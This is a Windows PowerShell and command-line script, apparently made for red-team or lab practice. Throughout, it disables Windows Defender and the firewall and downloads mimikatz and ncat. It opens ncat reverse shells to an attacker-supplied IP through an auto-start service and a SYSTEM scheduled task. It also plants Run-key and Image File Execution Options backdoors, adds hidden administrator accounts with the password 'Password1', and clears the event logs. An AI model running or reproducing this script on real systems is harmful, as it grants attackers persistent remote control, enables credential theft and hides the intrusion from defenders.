

$IP = Read-Host -Prompt 'Input attacker IP: '

#Disable Windows Defender
sc stop WinDefend
Set-MpPreference -DisableRealtimeMonitoring $true

#Turn off firewall
Netsh Advfirewall show allprofiles
NetSh Advfirewall set allprofiles state off

#Adding tools and backdoor files
New-Item -Path "c:\temp" -Name "logfiles" -ItemType "directory"
cd "c:\temp\logfiles"
wget https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe -o mimikatz.exe
wget https://nmap.org/dist/ncat-portable-5.59BETA1.zip -o ncat.zip
Expand-Archive ncat.zip
cp "c:\temp\logfiles\ncat\ncat-portable-5.59BETA1\ncat.exe" c:\temp\logfiles

New-Item -Path "C:\Users\backd00r.exe"
New-Item -Path "C:\Program Files\hiRyan.exe"
New-Item -Path "C:\lol.exe"

attrib +h "mimikatz.exe"
attrib +h "C:\Users\backd00r.exe"
attrib +h "C:\lol.exe"
attrib +h "C:\Program Files\hiRyan.exe"

#Adding rogue startup jobs
sc create windowsapi binPath= "C:\temp\logfiles\ncat.exe -e \windows\system32\cmd.exe $IP 8888" start= auto
sc failure windowsapi reset= 0 actions= restart/60000/restart/60000/restart/60000
sc start persistence


#Adding scheduled tasks
schtasks /create /ru SYSTEM /sc MINUTE /MO 1 /tn WindowsDefender /tr "C:\temp\logfiles\ncat.exe -e c:\windows\system32\cmd.exe $IP 7777"


#Adding rogue registry keys
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\backd00r.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\Users\backd00r.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\Users\backd00r.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\Users\backd00r.exe"

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\lol.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\lol.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\lol.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\lol.exe"

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Program Files\hiRyan.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\Program Files\hiRyan.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\Program Files\hiRyan.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\Program Files\hiRyan.exe"


#File Image Execution Hijakcing
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f

#Add dummy user
net user attacker Password1 /add
net localgroup administrators /add attacker
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v attacker /t REG_DWORD /d 0 /f


#Adding rogue users
$password = "Password1"

New-LocalUser -Name "WindowsDefender" -Password $password -FullName "Windows Defender"

New-LocalUser -Name "srvhost" -Password $password -FullName "Server Host"

New-LocalUser -Name "Admin" -Password $password


#Adding users to Administrator group
Add-LocalGroupMember -Group Administrator -Member WindowsDefender
Add-LocalGroupMember -Group Administrator -Member srvhost
Add-LocalGroupMember -Group Administrator -Member Admin


#Clearing all logs :)
cmd.exe /c wevtutil.exe cl System
cmd.exe /c wevtutil.exe cl Security

#Research Veil